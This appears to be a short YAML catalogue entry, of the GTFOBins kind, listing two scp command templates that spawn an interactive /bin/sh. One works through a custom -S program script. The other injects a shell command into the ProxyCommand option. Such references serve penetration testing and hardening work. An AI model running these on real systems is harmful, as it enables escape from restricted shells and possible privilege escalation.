commands:
- template: 'echo ''exec /bin/sh 0<&2 1>&2'' >/path/to/temp-file

    chmod +x /path/to/temp-file

    scp -S /path/to/temp-file x x:'
- template: 'scp -o ''ProxyCommand=;/bin/sh 0<&2 1>&2'' x x:'
